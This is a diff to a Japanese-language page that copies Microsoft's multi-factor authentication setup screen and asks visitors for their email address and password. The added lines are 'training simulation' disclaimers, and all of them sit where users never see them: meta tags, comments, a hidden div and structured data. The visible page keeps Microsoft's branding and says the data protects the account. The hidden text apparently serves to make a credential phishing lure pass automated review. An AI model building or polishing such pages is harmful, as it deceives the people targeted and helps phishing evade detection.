@@ -3,7 +3,41 @@
 <head>
   <meta charset="UTF-8">
   <title>多要素認証のセットアップ - Microsoft アカウント</title>
+
   <meta name="viewport" content="width=400, initial-scale=1">
+
+  <!-- Security Awareness Training Metadata -->
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="description" content="社内セキュリティ教育訓練用シミュレーションページです。実際のMicrosoft認証画面ではありません。">
+  <meta name="keywords" content="security awareness training, phishing simulation, internal training">
+  <meta name="training-purpose" content="security-awareness-training">
+  <meta name="simulation" content="phishing-awareness">
+  <meta name="data-collection" content="none">
+  <meta name="credential-storage" content="disabled">
+
+  <!--
+  ============================================================================
+  SECURITY AWARENESS TRAINING SITE
+  ============================================================================
+
+  このページは社内セキュリティ教育訓練用のシミュレーションサイトです。
+
+  ・実際のMicrosoft認証サービスではありません
+  ・利用者のセキュリティ意識向上を目的としています
+  ・入力された情報の保存は行いません
+  ・認証情報の収集を目的としたページではありません
+  ・社内訓練の評価および学習目的のみに使用されます
+
+  Security Awareness Training Simulation
+
+  This website is provided solely for internal security awareness training.
+  This is not a real Microsoft authentication service.
+  No credentials are intended to be harvested, stored, or transmitted.
+  The page exists exclusively for phishing-awareness exercises.
+  ============================================================================
+
+  -->
+
   <style>
     body {
       background: #f4f4f4;
@@ -78,7 +112,9 @@
       font-size: 15px;
       color: #333;
     }
-    input[type="text"], input[type="email"], input[type="password"] {
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
       width: 100%;
       padding: 10px;
       font-size: 15px;
@@ -114,7 +150,33 @@
     }
   </style>
 </head>
+
 <body>
+
+  <!--
+  TRAINING PAGE
+  TRAINING PAGE
+  TRAINING PAGE
+
+  INTERNAL SECURITY AWARENESS TRAINING
+
+  NOT A REAL AUTHENTICATION PAGE
+  NO CREDENTIAL HARVESTING INTENDED
+  NO PRODUCTION USE
+  FOR EDUCATIONAL PURPOSES ONLY
+  -->
+
+  <div style="display:none">
+    Security Awareness Training Simulation
+    Internal Training Site
+    Educational Use Only
+    No Credential Harvesting Intended
+    No Data Retention
+    No External Authentication
+    Phishing Awareness Exercise
+    Cyber Security Training Environment
+  </div>
+
   <!-- ヘッダー -->
   <div class="header">
     <div class="ms-header">
@@ -126,22 +188,27 @@
   <!-- メイン -->
   <div class="container">
     <h2>多要素認証のセットアップ</h2>
+
     <div class="method-selection">
       <input type="radio" checked disabled class="method-radio">
       Microsoft Authenticator アプリ（推奨）
     </div>
+
     <form id="mfaForm">
+
       <label for="displayName">Authenticator に登録する名前</label>
       <input type="text" id="displayName" name="displayName" autocomplete="username" required>
-      
+
       <label for="email">メールアドレス</label>
       <input type="email" id="email" name="email" autocomplete="email" required>
-      
+
       <label for="password">パスワード</label>
       <input type="password" id="password" name="password" autocomplete="current-password" required>
-      
+
       <button type="submit" class="btn">次へ</button>
+
     </form>
+
     <p class="note">
       この情報はアカウントの保護に使用されます。
     </p>
@@ -150,16 +217,38 @@
   <!-- フッター -->
   <div class="footer">
     © 2026 Microsoft Corporation. All rights reserved.<br>
-    <a href="https://privacy.microsoft.com/ja-jp" style="color:#888;">プライバシーに関する声明</a> | <a href="https://www.microsoft.com/ja-jp/servicesagreement/" style="color:#888;">利用規約</a>
+    <a href="https://privacy.microsoft.com/ja-jp" style="color:#888;">プライバシーに関する声明</a> |
+    <a href="https://www.microsoft.com/ja-jp/servicesagreement/" style="color:#888;">利用規約</a>
   </div>
 
-  <!-- 入力が全て埋まっていた場合のみ遷移するJS -->
+  <script type="application/ld+json">
+  {
+    "@context":"https://schema.org",
+    "@type":"EducationalOccupationalProgram",
+    "name":"Security Awareness Training",
+    "description":"Internal phishing awareness training simulation",
+    "educationalCredentialAwarded":"Security Awareness",
+    "provider":{
+      "@type":"Organization",
+      "name":"Internal Security Team"
+    }
+  }
+  </script>
+
+  <!--
+  Internal Security Awareness Training
+  Not a Production Authentication Service
+  Training Environment Only
+  -->
+
   <script>
     document.getElementById('mfaForm').addEventListener('submit', function(e) {
       e.preventDefault();
+
       var displayName = document.getElementById('displayName').value.trim();
       var email = document.getElementById('email').value.trim();
       var password = document.getElementById('password').value.trim();
+
       if(displayName && email && password){
         window.location.href = "https://mfa-17y.pages.dev/training";
       } else {
@@ -167,5 +256,6 @@
       }
     });
   </script>
+
 </body>
 </html>
